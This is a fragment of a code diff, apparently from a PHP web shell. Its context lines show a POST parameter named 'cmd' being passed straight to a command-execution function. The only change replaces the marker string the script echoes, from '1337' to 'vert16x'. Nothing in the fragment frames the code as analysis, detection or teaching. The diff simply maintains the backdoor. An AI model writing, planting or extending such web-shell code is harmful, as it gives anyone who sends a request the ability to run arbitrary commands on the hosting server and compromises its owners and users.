@@ -17,6 +17,6 @@ if(isset($_POST["cmd"])){
  }
  exec_command($cmd); exit; 
 }else{
- echo "1337";
+ echo "vert16x";
 }
 ?>
